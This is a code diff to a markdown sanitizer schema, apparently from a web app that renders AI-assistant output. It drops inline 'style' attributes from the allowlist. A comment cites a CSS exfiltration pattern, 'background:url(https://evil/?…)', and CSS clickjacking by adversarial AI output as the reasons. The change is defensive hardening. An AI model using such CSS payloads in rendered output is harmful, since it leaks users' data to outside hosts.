@@ -12,16 +12,17 @@ import DOMPurify from "isomorphic-dompurify";
 
 // rehype-sanitize runs AFTER rehype-raw, stripping <script>, event handlers
 // (onerror, onclick, …), and javascript: URLs while preserving formatting tags
-// that Claude / Codex / Gemini output. Keeps GFM tables + inline images + details
-// callouts visually intact.
+// that Claude / Codex / Gemini output.
+// NB: `style` is deliberately NOT in the allowlist — inline style lets adversarial
+// AI output exfil data via `background:url(https://evil/?…)` or do CSS clickjacking,
+// and rehype-sanitize does not URL-sanitize inside style values. Tailwind utility
+// classes via className are enough for the formatting we actually need.
 const markdownSanitizeSchema = {
   ...defaultSchema,
   attributes: {
     ...defaultSchema.attributes,
-    // Allow inline style + class on common tags so existing Claude output with
-    // `<span class="...">` or highlighted code blocks still renders.
-    span: [...(defaultSchema.attributes?.span || []), "className", "style"],
-    div: [...(defaultSchema.attributes?.div || []), "className", "style"],
+    span: [...(defaultSchema.attributes?.span || []), "className"],
+    div: [...(defaultSchema.attributes?.div || []), "className"],
     code: [...(defaultSchema.attributes?.code || []), "className"],
   },
 };
